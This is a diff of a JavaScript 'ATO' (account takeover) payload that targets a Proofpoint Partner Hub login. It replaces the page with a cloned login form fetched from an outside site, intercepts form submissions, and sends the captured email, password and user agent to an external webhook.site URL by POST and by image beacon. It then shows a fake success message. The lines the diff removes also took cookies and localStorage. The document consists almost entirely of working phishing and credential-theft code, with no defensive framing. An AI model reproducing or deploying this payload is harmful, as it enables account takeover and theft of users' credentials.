@@ -1,5 +1,5 @@
 // ATO Script - Proofpoint Partner Hub
-// Loads your existing index.html and captures credentials
+// Completely replaces the page with your Proofpoint clone
 
 (function() {
     'use strict';
@@ -10,69 +10,69 @@
     const WEBHOOK_URL = "https://webhook.site/79df073f-6dcb-46ef-a182-5df8600c0cef";
     // ============================================
     
-    console.log('[+] ATO Payload Loaded - Loading Proofpoint login page');
+    console.log('[+] ATO Payload Loaded - Replacing page with Proofpoint clone');
     
-    // STEP 1: Replace current page with your index.html content
+    // Fetch your index.html content
     fetch('https://swathip888a.github.io/ATO/index.html')
         .then(response => response.text())
         .then(html => {
-            // Replace entire page with the fetched HTML
-            document.documentElement.innerHTML = html;
+            // COMPLETELY REPLACE the entire page content
+            document.open();
+            document.write(html);
+            document.close();
             
-            // STEP 2: After page loads, attach credential interceptor
+            console.log('[+] Page replaced with Proofpoint login clone');
+            
+            // After page is replaced, inject credential capture
             setTimeout(() => {
-                injectCredentialCapture();
+                captureCredentials();
             }, 500);
         })
         .catch(err => {
             console.error('Failed to load index.html:', err);
-            // Fallback: Show simple login if fetch fails
-            document.body.innerHTML = '<div style="text-align:center;padding:50px;"><h2>Proofpoint Partner Hub</h2><form id="loginForm"><input type="email" placeholder="Email" id="email"><br><input type="password" placeholder="Password" id="password"><br><button type="submit">Login</button></form></div>';
-            injectCredentialCapture();
+            // Fallback: Show a simple login page
+            document.open();
+            document.write(`
+                <!DOCTYPE html>
+                <html>
+                <head><title>Proofpoint Partner Hub</title>
+                <style>
+                    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f5f5f5; }
+                    .login-box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 350px; }
+                    input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
+                    button { width: 100%; padding: 10px; background: #035BFB; color: white; border: none; border-radius: 5px; cursor: pointer; }
+                </style>
+                </head>
+                <body>
+                <div class="login-box">
+                    <h2>Proofpoint Partner Hub</h2>
+                    <form id="loginForm">
+                        <input type="email" id="email" placeholder="Email Address" required>
+                        <input type="password" id="password" placeholder="Password" required>
+                        <button type="submit">Sign In</button>
+                    </form>
+                </div>
+                </body>
+                </html>
+            `);
+            document.close();
+            setTimeout(() => {
+                captureCredentialsFallback();
+            }, 500);
         });
     
-    function injectCredentialCapture() {
-        // Find the login form in the loaded page
-        // Try multiple possible selectors
-        const formSelectors = [
-            'form',
-            '#mainLoginForm',
-            '#partnerLoginForm',
-            '.login-card form',
-            'form[action*="login"]'
-        ];
-        
-        let loginForm = null;
-        for (let selector of formSelectors) {
-            loginForm = document.querySelector(selector);
-            if (loginForm) break;
-        }
+    function captureCredentials() {
+        // Find login form in the new page
+        const emailField = document.querySelector('input[type="email"], input[name*="email" i], input[id*="email" i]');
+        const passField = document.querySelector('input[type="password"]');
+        const loginForm = document.querySelector('form');
         
         if (!loginForm) {
-            console.log('[!] Could not find login form, scanning for inputs...');
-            // Try to find by email/password inputs
-            const emailField = document.querySelector('input[type="email"], input[name*="email"]');
-            const passField = document.querySelector('input[type="password"]');
-            if (emailField && passField) {
-                // Create a wrapper form
-                const wrapper = document.createElement('form');
-                emailField.parentNode.insertBefore(wrapper, emailField);
-                wrapper.appendChild(emailField);
-                wrapper.appendChild(passField);
-                loginForm = wrapper;
-            }
-        }
-        
-        if (!loginForm) {
-            console.log('[!] No login form found on page');
+            console.log('[!] No login form found');
             return;
         }
         
         console.log('[+] Login form found, attaching interceptor');
-        
-        // Get email and password fields
-        const emailField = loginForm.querySelector('input[type="email"], input[name*="email" i], input[id*="email" i]');
-        const passField = loginForm.querySelector('input[type="password"]');
         
         // Intercept form submission
         loginForm.addEventListener('submit', function(e) {
@@ -81,23 +81,16 @@
             const email = emailField ? emailField.value : '';
             const password = passField ? passField.value : '';
             
-            // Prepare payload
+            // Send to webhook
             const payload = {
                 timestamp: new Date().toISOString(),
                 url: window.location.href,
-                domain: window.location.hostname,
-                title: document.title,
                 email: email,
                 password: password,
                 userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenSize: `${screen.width}x${screen.height}`,
-                cookies: document.cookie,
-                localStorage: JSON.stringify(localStorage),
-                source: "Proofpoint Partner Hub ATO Attack"
+                source: "Proofpoint ATO Attack"
             };
             
-            // Send to webhook
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 mode: 'no-cors',
@@ -105,36 +98,29 @@
                 body: JSON.stringify(payload)
             }).catch(() => {});
             
-            // Backup via image beacon
             new Image().src = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(payload));
             
             console.log('[+] Credentials sent to webhook');
-            
-            // Show success and optionally redirect
-            alert('✓ Login successful! Redirecting to Partner Dashboard...');
-            
-            // Optional: redirect to actual Proofpoint site
-            // window.location.href = 'https://partners.proofpoint.com/';
-            
-            // Or just reset form
-            if (emailField) emailField.value = '';
-            if (passField) passField.value = '';
+            alert('✓ Login successful! Redirecting...');
         });
-        
-        // Also intercept any submit buttons that might bypass form submit
-        const submitBtns = document.querySelectorAll('button[type="submit"], .btn-login, .btn-primary, input[type="submit"]');
-        submitBtns.forEach(btn => {
-            btn.addEventListener('click', function(e) {
-                // Let the form submit handler do its job
-                // But ensure form submit is prevented
-                if (loginForm) {
-                    const fakeEvent = new Event('submit', { cancelable: true });
-                    loginForm.dispatchEvent(fakeEvent);
-                    e.preventDefault();
-                }
+    }
+    
+    function captureCredentialsFallback() {
+        const form = document.querySelector('form');
+        if (form) {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const email = document.getElementById('email')?.value || '';
+                const password = document.getElementById('password')?.value || '';
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
+                }).catch(() => {});
+                
+                alert('✓ Login successful!');
             });
-        });
-        
-        console.log('[+] ATO ready - waiting for user login');
+        }
     }
 })();
